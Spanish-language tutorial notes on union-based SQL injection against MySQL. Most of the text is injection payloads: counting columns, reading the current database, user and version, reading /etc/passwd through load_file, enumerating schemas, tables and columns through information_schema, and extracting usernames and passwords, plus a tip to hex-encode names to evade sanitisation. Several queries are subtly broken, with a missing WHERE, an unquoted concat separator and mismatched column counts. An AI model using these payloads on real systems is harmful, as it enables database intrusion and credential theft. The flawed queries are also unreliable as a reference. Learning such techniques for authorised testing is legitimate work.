En caso de tener una vulnerabilidad a inyecciones SQL y al inyectar algo vemos el sql, podemos empezar a enumerar las columnas de la tabla a la cual se esta consultado.

**Inyeccion basada en error**
``` sql
-- - consulta original
select * from users where id = 1;
-- - inyeccion
select * from users where id = 1 order by 4;-- -;
```

En caso de no ver el error podemos hacer unas inyecciones basadas en tiempo, en base a estas podemo determinar si es valida o no (pentesting avanzado).

Ahora volviendo al ejemplo, una vez enumerado las columnas, les podemos poder etiquetas a cada una de estar y aprobecharnos de las etiquetas para exponer informacion sensible.

``` sql
-- - numero de columnas en union select
select * from users where id = 1 union select 1,2,3,"etiqueta de prueba";-- -
-- - muestra la db en uso
select * from users where id = 1 union select 1,2,database(),"etiqueta de prueba";-- -
-- - user() : User que corre la db
-- - @@version : Version de Mysql
-- - load_file('/etc/passwd') : Incluye un archivo del sistema, solo funciona en consola, en web se tiene que aplicar una inyeccion mas avanzada

-- - Ahora como atacante nos puede interesar las demas schemas(databases)
-- - Aplicando: select schema_name from information_schema.schemata;
select * from users where id = 1 union select 1,2,schema_name,4 from information_schema.schemata;-- -

-- - Extraemos las tablas de un schema
-- - Aplicando: select table_name from information_schema.tables where table_schema = "db_name";
select * from users where id = 1 union select 1,2,schema_name,4 from information_schema.tables table_schema = "db_name";-- -

-- - Extraccion de columnas
-- - Con el limit indicamos la vizualizacion de la primer columna.
select * from users where id = 1 union select 1,column_name,2,3,4 from information_schema.columns where table_schema = "db_name" and table_name="users" limit 1,1;-- -

-- - Extraccion de datos
-- - Ya conocemos la db, tabla y las columnas asi que realizamos una sql normal
select * from users where id = 1 union select 1,concat(username,:,password),3,4 from colegio.users;-- -

```

Nota:
Podemos llamar una db_name en hexadecimal para evadir una sanitizacion